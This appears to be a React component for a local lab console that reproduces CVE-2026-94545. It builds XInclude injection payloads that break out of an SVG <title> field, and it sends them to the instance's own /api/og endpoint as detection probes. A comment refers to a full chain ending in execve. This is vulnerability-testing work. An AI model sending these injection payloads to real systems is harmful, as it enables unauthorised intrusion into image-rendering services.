'use client'

import { useEffect, useState } from 'react'

const XI = 'xmlns:xi="http://www.w3.org/2001/XInclude"'

function buildSvg() {
  return '<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="630">' +
    '<filter id="t"><feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="4" stitchTiles="stitch"/></filter>' +
    '<rect width="1200" height="630" filter="url(#t)"/></svg>'
}

function probePayload() {
  return '</title><xi:include ' + XI + ' href="data:image/svg+xml;base64,' +
    btoa(buildSvg()) + '" parse="xml"/><title>'
}

function controlPayload() {
  const encoded = btoa(buildSvg())
  return '</title><xi:include ' + XI + ' href="data:image/svg+xml;base64,X' +
    encoded.slice(1) + '" parse="xml"/><title>'
}

const PRESETS = [
  { name: 'detection probe (valid XInclude)', value: probePayload },
  { name: 'detection control (corrupted include)', value: controlPayload },
  { name: 'plain text (baseline)', value: () => 'hello from the lab console' }
]

export default function LabConsole() {
  const [info, setInfo] = useState(null)
  const [payload, setPayload] = useState('')
  const [result, setResult] = useState(null)
  const [busy, setBusy] = useState(false)

  useEffect(() => {
    fetch('/api/lab-info')
      .then((r) => r.json())
      .then(setInfo)
      .catch(() => setInfo({ error: 'lab-info unavailable' }))
    setPayload(probePayload())
  }, [])

  async function send(method) {
    setBusy(true)
    setResult(null)
    const started = performance.now()
    try {
      const url = method === 'POST'
        ? '/api/og'
        : '/api/og?value=' + encodeURIComponent(payload)
      const response = await fetch(url, method === 'POST'
        ? { method: 'POST', headers: { 'content-type': 'text/plain' }, body: payload }
        : { method: 'GET' })
      const buffer = await response.arrayBuffer()
      setResult({
        ok: true,
        status: response.status,
        contentType: response.headers.get('content-type'),
        bytes: buffer.byteLength,
        ms: Math.round(performance.now() - started),
        preview: response.headers.get('content-type')?.startsWith('image/')
          ? URL.createObjectURL(new Blob([buffer], { type: 'image/png' }))
          : null
      })
    } catch (err) {
      setResult({
        ok: false,
        error: String(err),
        ms: Math.round(performance.now() - started),
        note: 'The connection dropped before a response arrived. That is the expected outcome after a successful chain: execve replaced the worker process.'
      })
    }
    setBusy(false)
  }

  const rows = info && [
    ['node', info.node],
    ['runtime', info.runtime],
    ['next', info.next],
    ['satori', info.satori],
    ['sharp', info.sharp],
    ['libvips', info.libvips],
    ['librsvg', info.librsvg],
    ['libxml2', info.libxml2]
  ]

  return (
    <main style={{ fontFamily: 'ui-monospace,SFMono-Regular,Menlo,monospace', maxWidth: 900, margin: '40px auto', padding: '0 20px', lineHeight: 1.5 }}>
      <p><a href="/">← back to the lab index</a></p>
      <h1>CVE-2026-94545 — local test console</h1>
      <p style={{ color: '#555' }}>
        This page talks to <code>/api/og</code> of this very instance. Use the presets to reproduce
        the template behaviour by hand: a valid XInclude inflates the PNG on a native (vulnerable)
        pipeline, the corrupted twin never does.
      </p>

      {rows && (
        <table style={{ borderCollapse: 'collapse', margin: '18px 0' }}>
          <tbody>
            {rows.map(([k, v]) => (
              <tr key={k}>
                <td style={{ padding: '2px 14px 2px 0', color: '#777' }}>{k}</td>
                <td style={{ padding: '2px 0' }}>{String(v ?? '—')}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}

      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', margin: '10px 0' }}>
        {PRESETS.map((preset) => (
          <button key={preset.name} onClick={() => setPayload(preset.value())} style={{ padding: '6px 10px', cursor: 'pointer' }}>
            {preset.name}
          </button>
        ))}
      </div>

      <textarea
        value={payload}
        onChange={(e) => setPayload(e.target.value)}
        spellCheck={false}
        style={{ width: '100%', height: 150, fontFamily: 'inherit', fontSize: 12 }}
      />

      <div style={{ display: 'flex', gap: 8, margin: '10px 0' }}>
        <button disabled={busy} onClick={() => send('POST')} style={{ padding: '8px 14px', cursor: 'pointer' }}>
          POST /api/og
        </button>
        <button disabled={busy} onClick={() => send('GET')} style={{ padding: '8px 14px', cursor: 'pointer' }}>
          GET /api/og?value=
        </button>
        <span style={{ alignSelf: 'center', color: '#777' }}>payload size: {payload.length} B</span>
      </div>

      {result && (
        <pre style={{ background: '#f5f5f5', padding: 14, borderRadius: 6, whiteSpace: 'pre-wrap' }}>
          {JSON.stringify(result, null, 2)}
        </pre>
      )}
      {result && result.preview && (
        <p><img src={result.preview} alt="rendered response" style={{ maxWidth: '100%', border: '1px solid #ddd' }} /></p>
      )}
    </main>
  )
}
